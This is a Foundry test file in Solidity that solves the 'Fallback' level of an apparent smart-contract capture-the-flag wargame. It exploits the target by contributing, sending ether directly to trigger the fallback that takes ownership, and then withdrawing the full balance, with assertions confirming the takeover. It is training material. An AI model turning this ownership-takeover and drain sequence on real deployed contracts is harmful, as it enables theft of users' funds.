// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/level01.sol";

contract AttackerFallbackTest is Test {
    function testLevel01() external {
        vm.prank(address(0x1));
        Fallback level01 = new Fallback();

        level01.contribute{value: 1 wei}();
        level01.getContribution();

        console.log("Current Owner is: ", level01.owner());

        assertFalse(level01.owner() == address(this));
        assertFalse(address(level01).balance == 0);

        (bool success, ) = address(level01).call{value: 1 wei}("");
        require(success, "Transfer failed!");

        level01.withdraw();

        assertTrue(level01.owner() == address(this));
        assertTrue(address(level01).balance == 0);

        console.log("New Owner is: ", level01.owner());
    }

    receive() external payable {}
}
